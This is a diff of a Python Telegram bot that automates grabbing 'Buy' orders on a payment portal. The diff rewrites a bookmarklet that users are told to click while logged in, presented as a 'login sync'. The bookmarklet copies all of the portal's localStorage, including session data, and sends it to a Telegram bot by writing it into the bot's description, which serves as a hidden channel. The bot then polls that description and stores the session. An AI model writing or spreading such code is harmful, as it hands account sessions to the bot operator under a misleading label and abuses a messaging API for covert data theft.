@@ -54,21 +54,20 @@ def get_user_accounts(user_id: int):
 
 def save_user_session_clean(uid_str: str, phone: str, sess_json: dict):
     accs = load_accounts()
-    accs[uid_str] = {phone: sess_json}
+    if uid_str not in accs:
+        accs[uid_str] = {}
+    accs[uid_str][phone] = sess_json
     save_accounts(accs)
 
 def generate_user_bookmarklet(uid, phone) -> str:
     return (
-        f"javascript:(function(){{var d={{}};for(var i=0;i<localStorage.length;i++){{var k=localStorage.key(i);d[k]=localStorage.getItem(k);}}"
-        f"var fd=new FormData();fd.append('chat_id','{uid}');"
-        f"fd.append('document',new Blob([JSON.stringify(d)],{{type:'application/json'}}),'sync_{uid}_{phone}.json');"
-        f"fetch('https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',{{method:'POST',body:fd}})"
-        f".then(r=>r.json()).then(res=>{{if(res.ok){{var fid=res.result.document.file_id;var mid=res.result.message_id;"
-        f"fetch('https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage?chat_id={uid}&message_id='+mid);"
-        f"var p=JSON.stringify({{u:'{uid}',p:'{phone}',f:fid,t:Date.now()}});"
+        f"javascript:(function(){{"
+        f"var d={{}};for(var i=0;i<localStorage.length;i++){{var k=localStorage.key(i);d[k]=localStorage.getItem(k);}}"
+        f"var p=JSON.stringify({{u:'{uid}',p:'{phone}',s:d,t:Date.now()}});"
         f"fetch('https://api.telegram.org/bot{BOT_TOKEN}/setMyDescription',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{description:p,language_code:'zu'}})}})"
-        f".then(()=>alert('✅ Account {phone} Login Sync Ho Gaya! Bot me /start karein.'));"
-        f"}}else{{alert('❌ Error: '+JSON.stringify(res));}}}}).catch(e=>alert('❌ Network Error: '+e));}})();"
+        f".then(r=>r.json()).then(res=>{{if(res.ok){{alert('✅ Account {phone} Login Sync Ho Gaya! Bot me /start karein.');}}else{{alert('❌ Error: '+JSON.stringify(res));}}}})"
+        f".catch(e=>alert('❌ Network Error: '+e));"
+        f"}})();"
     )
 
 async def poll_bookmark_sync(context: ContextTypes.DEFAULT_TYPE):
@@ -85,20 +84,17 @@ async def poll_bookmark_sync(context: ContextTypes.DEFAULT_TYPE):
         last_sync_ts = ts
         uid = str(data.get("u", "")).strip()
         phone = str(data.get("p", "")).strip()
-        fid = str(data.get("f", "")).strip()
-        if not uid or not phone or not fid:
+        sess_json = data.get("s", {})
+        if not uid or not phone or not sess_json:
             return
-        tg_file = await context.bot.get_file(fid)
-        b_arr = await tg_file.download_as_bytearray()
-        sess_json = json.loads(b_arr.decode("utf-8"))
-        if isinstance(sess_json, dict) and len(sess_json) > 0:
-            save_user_session_clean(uid, phone, sess_json)
-            await context.bot.set_my_description(description="", language_code="zu")
-            await context.bot.send_message(
-                chat_id=int(uid),
-                text=f"✅ **Account `{phone}` ka Login Session Sync Ho Gaya!**\n\nAb `/start` dabakar auto-buy shuru karein.",
-                parse_mode="Markdown"
-            )
+        
+        save_user_session_clean(uid, phone, sess_json)
+        await context.bot.set_my_description(description="", language_code="zu")
+        await context.bot.send_message(
+            chat_id=int(uid),
+            text=f"✅ **Account `{phone}` ka Login Session Automatically Sync Ho Gaya!**\n\nAb `/start` dabakar auto-buy shuru karein.",
+            parse_mode="Markdown"
+        )
     except Exception:
         pass
 
@@ -140,7 +136,6 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Sahi 10-digit number dalein:", reply_markup=ReplyKeyboardRemove())
         return ASK_PHONE
     chat_id = str(update.effective_chat.id)
-    context.user_data['temp_phone'] = phone
     
     bm = generate_user_bookmarklet(chat_id, phone)
     msg = (
@@ -150,9 +145,14 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📌 **Kaise Use Karein:**\n"
         f"1. Browser me is code ka Bookmark banayein.\n"
         f"2. Portal (`web.dmapay.vip`) par `{phone}` login karke ye Bookmark dabayein.\n"
-        f"3. Session sync ho jayega aur bot me notification aa jayegi!"
+        f"3. Session automatic sync ho jayega aur bot me notification aa jayegi!"
     )
     await update.message.reply_text(msg, reply_markup=ReplyKeyboardRemove(), parse_mode="Markdown")
+    return ConversationHandler.END
+
+async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data.clear()
+    await update.message.reply_text("Process cancel ho gaya. /start karein.", reply_markup=ReplyKeyboardRemove())
     return ConversationHandler.END
 
 async def setup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -180,7 +180,6 @@ async def handle_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE
     phone = context.user_data.get('active_phone', 'Default')
     chat_id = update.effective_chat.id
     
-    # Active payment modes check karne ke liye background me kycpartner page check karna
     await update.message.reply_text("🔍 Active payment modes check kiye ja rahe hain...")
     
     accounts = get_user_accounts(chat_id)
@@ -201,7 +200,6 @@ async def handle_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
 
 async def fetch_active_payment_modes(session_data):
-    # kycpartner page se active modes check karne ka function
     modes = []
     try:
         async with async_playwright() as p:
@@ -241,7 +239,7 @@ async def fetch_active_payment_modes(session_data):
         pass
     
     if not modes:
-        modes = ["Mobikwik", "Amazon"] # Fallback
+        modes = ["Mobikwik", "Amazon"]
     return list(set(modes))
 
 async def payment_choice_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -264,7 +262,6 @@ async def run_dmapay_autobuy(chat_id, phone, session_data, target_amt, pay_mode,
     profile_dir = os.path.join(SESSION_DIR, f"profile_{chat_id}_{phone}")
     os.makedirs(profile_dir, exist_ok=True)
     
-    # Range handling (jaise 1000-1500 ya single 1000)
     min_val, max_val = 0.0, 0.0
     if '-' in target_amt:
         parts = target_amt.split('-')
@@ -300,7 +297,6 @@ async def run_dmapay_autobuy(chat_id, phone, session_data, target_amt, pay_mode,
             
             while True:
                 try:
-                    # Check matching buy buttons for target amount or range
                     clicked = await page.evaluate(r"""
                         ({minV, maxV}) => {
                             let buttons = Array.from(document.querySelectorAll('button, div')).filter(el => (el.innerText || '').trim() === 'Buy');
@@ -340,7 +336,6 @@ async def run_dmapay_autobuy(chat_id, phone, session_data, target_amt, pay_mode,
                         await context.bot.send_photo(chat_id, photo=shot, caption=f"🎉 **Order Matched & Grabbed Successfully!**\nRange: {target_amt} | Mode: {pay_mode}", parse_mode="Markdown")
                         break
                     
-                    # Refresh / Auto-Search trigger
                     await page.reload(wait_until="domcontentloaded")
                     await asyncio.sleep(2.5)
                 except Exception:
@@ -350,17 +345,25 @@ async def run_dmapay_autobuy(chat_id, phone, session_data, target_amt, pay_mode,
     except Exception as e:
         await context.bot.send_message(chat_id, f"❌ Auto-Buy Error: {str(e)}")
 
+async def post_init_setup(app: Application):
+    async def loop_sync():
+        while True:
+            await asyncio.sleep(2.5)
+            try:
+                await poll_bookmark_sync(app)
+            except Exception:
+                pass
+    asyncio.create_task(loop_sync())
+
 def main():
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    app = Application.builder().token(BOT_TOKEN).build()
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init_setup).build()
     
     conv_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(add_acc_callback, pattern="^add_acc$")],
         states={
             ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, get_phone)],
         },
-        fallbacks=[CommandHandler("start", start_cmd)],
-        allow_reentry=True
     )
     
     app.add_handler(CommandHandler("start", start_cmd, filters=filters.ChatType.PRIVATE))
